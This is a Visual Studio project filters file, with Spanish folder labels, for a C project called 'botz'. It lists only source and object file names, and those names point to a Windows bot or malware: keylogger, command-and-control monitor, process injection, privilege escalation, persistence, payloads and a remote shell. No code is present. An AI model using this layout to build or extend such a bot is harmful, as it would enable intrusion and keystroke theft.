<?xml version="1.0" encoding="utf-8"?>
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <ItemGroup>
    <Filter Include="Archivos de origen">
      <UniqueIdentifier>{4FC737F1-C7A5-4376-A066-2A32D752A2FF}</UniqueIdentifier>
      <Extensions>cpp;c;cc;cxx;c++;cppm;ixx;def;odl;idl;hpj;bat;asm;asmx</Extensions>
    </Filter>
    <Filter Include="Archivos de encabezado">
      <UniqueIdentifier>{93995380-89BD-4b04-88EB-625FBE52EBFB}</UniqueIdentifier>
      <Extensions>h;hh;hpp;hxx;h++;hm;inl;inc;ipp;xsd</Extensions>
    </Filter>
    <Filter Include="Archivos de recursos">
      <UniqueIdentifier>{67DA6AB6-F800-4c08-8B7A-83BB121AAD01}</UniqueIdentifier>
      <Extensions>rc;ico;cur;bmp;dlg;rc2;rct;bin;rgs;gif;jpg;jpeg;jpe;resx;tiff;tif;png;wav;mfcribbon-ms</Extensions>
    </Filter>
  </ItemGroup>
  <ItemGroup>
    <ClInclude Include="..\..\botz\src\api.h">
      <Filter>Archivos de origen</Filter>
    </ClInclude>
    <ClInclude Include="..\..\botz\src\base64.h">
      <Filter>Archivos de origen</Filter>
    </ClInclude>
    <ClInclude Include="..\..\botz\src\cc_monitor.h">
      <Filter>Archivos de origen</Filter>
    </ClInclude>
    <ClInclude Include="..\..\botz\src\command.h">
      <Filter>Archivos de origen</Filter>
    </ClInclude>
    <ClInclude Include="..\..\botz\src\config.h">
      <Filter>Archivos de origen</Filter>
    </ClInclude>
    <ClInclude Include="..\..\botz\src\crypto.h">
      <Filter>Archivos de origen</Filter>
    </ClInclude>
    <ClInclude Include="..\..\botz\src\escalation.h">
      <Filter>Archivos de origen</Filter>
    </ClInclude>
    <ClInclude Include="..\..\botz\src\http.h">
      <Filter>Archivos de origen</Filter>
    </ClInclude>
    <ClInclude Include="..\..\botz\src\info.h">
      <Filter>Archivos de origen</Filter>
    </ClInclude>
    <ClInclude Include="..\..\botz\src\inject.h">
      <Filter>Archivos de origen</Filter>
    </ClInclude>
    <ClInclude Include="..\..\botz\src\keylogger.h">
      <Filter>Archivos de origen</Filter>
    </ClInclude>
    <ClInclude Include="..\..\botz\src\md5.h">
      <Filter>Archivos de origen</Filter>
    </ClInclude>
    <ClInclude Include="..\..\botz\src\misc.h">
      <Filter>Archivos de origen</Filter>
    </ClInclude>
    <ClInclude Include="..\..\botz\src\payloads.h">
      <Filter>Archivos de origen</Filter>
    </ClInclude>
    <ClInclude Include="..\..\botz\src\pe.h">
      <Filter>Archivos de origen</Filter>
    </ClInclude>
    <ClInclude Include="..\..\botz\src\persistence.h">
      <Filter>Archivos de origen</Filter>
    </ClInclude>
    <ClInclude Include="..\..\botz\src\process.h">
      <Filter>Archivos de origen</Filter>
    </ClInclude>
    <ClInclude Include="..\..\botz\src\rthreads.h">
      <Filter>Archivos de origen</Filter>
    </ClInclude>
    <ClInclude Include="..\..\botz\src\security.h">
      <Filter>Archivos de origen</Filter>
    </ClInclude>
    <ClInclude Include="..\..\botz\src\shell.h">
      <Filter>Archivos de origen</Filter>
    </ClInclude>
    <ClInclude Include="..\..\botz\src\syscall.h">
      <Filter>Archivos de origen</Filter>
    </ClInclude>
    <ClInclude Include="..\..\botz\src\task_reply.h">
      <Filter>Archivos de origen</Filter>
    </ClInclude>
    <ClInclude Include="..\..\botz\src\windows.h">
      <Filter>Archivos de origen</Filter>
    </ClInclude>
  </ItemGroup>
  <ItemGroup>
    <ClCompile Include="..\..\botz\src\base64.c">
      <Filter>Archivos de origen</Filter>
    </ClCompile>
    <ClCompile Include="..\..\botz\src\cc_monitor.c">
      <Filter>Archivos de origen</Filter>
    </ClCompile>
    <ClCompile Include="..\..\botz\src\command.c">
      <Filter>Archivos de origen</Filter>
    </ClCompile>
    <ClCompile Include="..\..\botz\src\crypto.c">
      <Filter>Archivos de origen</Filter>
    </ClCompile>
    <ClCompile Include="..\..\botz\src\escalation.c">
      <Filter>Archivos de origen</Filter>
    </ClCompile>
    <ClCompile Include="..\..\botz\src\http.c">
      <Filter>Archivos de origen</Filter>
    </ClCompile>
    <ClCompile Include="..\..\botz\src\info.c">
      <Filter>Archivos de origen</Filter>
    </ClCompile>
    <ClCompile Include="..\..\botz\src\inject.c">
      <Filter>Archivos de origen</Filter>
    </ClCompile>
    <ClCompile Include="..\..\botz\src\keylogger.c">
      <Filter>Archivos de origen</Filter>
    </ClCompile>
    <ClCompile Include="..\..\botz\src\main.c">
      <Filter>Archivos de origen</Filter>
    </ClCompile>
    <ClCompile Include="..\..\botz\src\md5.c">
      <Filter>Archivos de origen</Filter>
    </ClCompile>
    <ClCompile Include="..\..\botz\src\misc.c">
      <Filter>Archivos de origen</Filter>
    </ClCompile>
    <ClCompile Include="..\..\botz\src\pe.c">
      <Filter>Archivos de origen</Filter>
    </ClCompile>
    <ClCompile Include="..\..\botz\src\persistence.c">
      <Filter>Archivos de origen</Filter>
    </ClCompile>
    <ClCompile Include="..\..\botz\src\process.c">
      <Filter>Archivos de origen</Filter>
    </ClCompile>
    <ClCompile Include="..\..\botz\src\rthreads.c">
      <Filter>Archivos de origen</Filter>
    </ClCompile>
    <ClCompile Include="..\..\botz\src\security.c">
      <Filter>Archivos de origen</Filter>
    </ClCompile>
    <ClCompile Include="..\..\botz\src\shell.c">
      <Filter>Archivos de origen</Filter>
    </ClCompile>
    <ClCompile Include="..\..\botz\src\syscall.c">
      <Filter>Archivos de origen</Filter>
    </ClCompile>
    <ClCompile Include="..\..\botz\src\task_reply.c">
      <Filter>Archivos de origen</Filter>
    </ClCompile>
  </ItemGroup>
  <ItemGroup>
    <Object Include="..\..\botz\src\getprocaddress.o">
      <Filter>Archivos de origen</Filter>
    </Object>
    <Object Include="..\..\botz\src\x64gate.obj">
      <Filter>Archivos de origen</Filter>
    </Object>
  </ItemGroup>
</Project>